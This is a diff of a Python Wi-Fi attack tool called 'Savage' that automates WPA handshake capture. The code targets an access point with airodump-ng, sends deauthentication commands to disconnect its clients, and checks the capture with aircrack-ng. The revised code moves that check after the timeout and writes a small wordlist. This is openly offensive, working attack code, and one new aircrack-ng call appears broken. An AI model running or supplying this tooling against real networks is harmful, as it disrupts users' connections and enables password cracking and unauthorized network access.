@@ -1,8 +1,8 @@
 """
 
     Savage
-    Version 0.03b
-    June 25th, 2021
+    Version 0.03d
+    July 8th, 2021
     
     author:  Joe "Cas" Casanova (joecasanova@gmail.com)
     
@@ -216,7 +216,7 @@ def scan():
             if not jobs[a]["timeRemain"] > 0 or\
             not CONFIG["currentJobs"][jobID]["thread"].is_alive():
                 CONFIG["currentJobs"][jobID]["thread"].join()
-                CONFIG["currentJobs"]["jobList"].remove(a)
+                #CONFIG["currentJobs"]["jobList"].remove(a)
             else:
                 print(str(a) + "\t" + jobs[a]["type"] + "\t" +\
                     str(jobs[a]["timeRemain"]) +"\t" +\
@@ -290,7 +290,7 @@ def threaded_handshake_capture(jobID, junk):
     #
     # Intended to be threaded
     ##########################################################################
-    
+
     start_time = time.time()
     seconds_running = 0
     got_handshake = False
@@ -302,7 +302,7 @@ def threaded_handshake_capture(jobID, junk):
         targetData["ap"].ssid + "-" + targetData["ap"].bssid
     remove_temp_files(filename)
     #remove_airodump_files(filename) #remove any old .cap files for this ap
-# Start airodump-ng process to capture handshakes
+    # Start airodump-ng process to capture handshakes
     cmd = ['airodump-ng',
        '-w', filename,
        '-c', targetData["ap"].channel,
@@ -310,8 +310,8 @@ def threaded_handshake_capture(jobID, junk):
        '--bssid', targetData["ap"].bssid,
        CONFIG["captureInterface"]]
     proc_read = Popen(cmd, stdout=open(os.devnull, 'w'),\
-        stderr=open(os.devnull, 'w'), shell=True, preexec_fn=os.setsid)
-    while seconds_running <= CONFIG["attackTimeout"] and got_handshake == False:
+        stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
+    while seconds_running <= CONFIG["attackTimeout"] and got_handshake == False and CONFIG['shutdown'] == False:
         seconds_running = int(time.time() - start_time)
         CONFIG["currentJobs"][jobID]["timeRemain"] = CONFIG["attackTimeout"] - seconds_running
         for client in targetData["clients"]:
@@ -329,37 +329,8 @@ def threaded_handshake_capture(jobID, junk):
                        CONFIG["captureInterface"]]
                 debug_log('Running deauth command: ' + ' '.join(cmd))
                 proc_deauth = Popen(cmd, stdout=open(os.devnull, 'w'),\
-                    stderr=open(os.devnull, 'w'),shell=True, preexec_fn=os.setsid)
+                    stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
                 proc_deauth.wait()
-                if not os.path.exists(filename + '-01.cap'): continue
-                tempfilename = CONFIG["tempPath"] + str(jobID) + '-wpa-' +\
-                targetData["ap"].ssid + "-" +\
-                targetData["ap"].bssid + '-01.cap.temp'
-                time.sleep(2)
-                copy(filename + '-01.cap',\
-                    tempfilename)
-                crack = 'echo "" | aircrack-ng -a 2 -w - -b ' +\
-                    targetData["ap"].bssid +\
-                    ' ' + tempfilename
-                debug_log('Cracking: ' + crack)
-                proc_crack = Popen(crack, stdout=PIPE,\
-                stderr=open(os.devnull, 'w'), shell=True, preexec_fn=os.setsid)
-                proc_crack.wait()
-                txt = proc_crack.communicate()[0]
-                debug_log("Aircrack output: " + txt)
-                got_handshake = txt.find(b'Passphrase not in dictionary') != -1
-                if got_handshake:
-                    debug_log("Captured handshake for: " + targetData["ap"])
-                    send_interrupt(proc_read)
-                    send_interrupt(proc_deauth)
-                    newfilename = CONFIG["handshakePath"] + '/' + targetData["ap"].ssid +\
-                    '-' + targetData["ap"].bssid + '.cap'
-                    rename(tempfilename, newfilename)
-                    CONFIG["capturedSession"] = CONFIG["capturedSession"] + 1
-                    CONFIG["currentJobs"]["jobList"].remove(jobID)
-                    remove_temp_files(filename)
-                    #remove_airodump_files(filename)
-                    return
             except KeyboardInterrupt:
                 send_interrupt(proc_read)
                 try:
@@ -372,6 +343,32 @@ def threaded_handshake_capture(jobID, junk):
                 return
     debug_log("Attack timed out! Killing airodump instance for jobID: " + str(jobID))
     send_interrupt(proc_read)
+    debug_log("Checking for captured handshakes for jobID: " + str(jobID))
+    #if not os.path.exists(filename + '-01.cap'): continue
+    tempfilename = CONFIG["tempPath"] + str(jobID) + '-wpa-' +\
+    targetData["ap"].ssid + "-" +\
+    targetData["ap"].bssid + '-01.cap'
+    time.sleep(2)
+    #copy(filename + '-01.cap', tempfilename)
+    crack = 'aircrack-ng -a 2 -w ./wordlist -b ' +\
+        targetData["ap"].bssid +\
+        " '" + tempfilename + "'"
+    debug_log('Cracking: ' + crack)
+    proc_crack = Popen(crack, stdout=PIPE,\
+    stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
+    proc_crack.wait()
+    txt = proc_crack.communicate()[0]
+    #debug_log("Aircrack output: " + txt.decode('utf-8'))
+    got_handshake = txt.decode('utf-8').find('KEY NOT FOUND') != -1
+    if got_handshake:
+        debug_log("Captured handshake for: " + str(targetData["ap"].ssid))
+        newfilename = CONFIG["handshakePath"] + '/' + targetData["ap"].ssid +\
+        '-' + targetData["ap"].bssid + '.cap'
+        rename(tempfilename, newfilename)
+        CONFIG["capturedSession"] = CONFIG["capturedSession"] + 1
+    else:
+        debug_log("Handshake not found in " + tempfilename)
+    CONFIG["currentJobs"]["jobList"].remove(jobID)
     remove_temp_files(filename)
     #remove_airodump_files(filename)
     return
@@ -518,7 +515,8 @@ def parse_csv(filename):
 def clear_temp_files(baseDir):
     #debug_log('Attempting to delete all contents of directory: ' + baseDir)
     for f in os.listdir(baseDir):
-        remove_file(f)
+        #print(baseDir + f)
+        remove_file(baseDir + f)
 
 def remove_temp_files(prefix):
     ##########################################################################
@@ -752,6 +750,8 @@ def main():
 
     file = open('/usr/share/savage/savage-debug.log','w+')
     file.close()
+    with open('./wordlist','w+') as wordlist:
+        wordlist.write('password')
     # now call scan() to get started.
     scan()
 
